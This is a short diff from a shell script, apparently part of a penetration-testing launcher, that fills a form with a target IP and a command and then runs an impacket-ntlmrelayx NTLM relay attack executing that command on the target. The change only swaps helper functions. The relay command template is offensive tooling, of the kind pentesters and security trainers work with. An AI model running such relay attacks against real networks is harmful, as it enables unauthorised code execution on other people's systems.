@@ -14,5 +14,5 @@ generate_form "${TARGET_IP_FIELD}" "${CMD_FIELD}"
 TARGET_IP=${form_data["target_ip"]}
 CMD=${form_data["cmd"]}
 
-paste_command "impacket-ntlmrelayx --no-http-server -smb2support -t ${TARGET_IP} -c '${CMD}'"
-xdotool key Return
+execute_command "impacket-ntlmrelayx --no-http-server -smb2support -t ${TARGET_IP} -c '${CMD}'"
+create_new_line
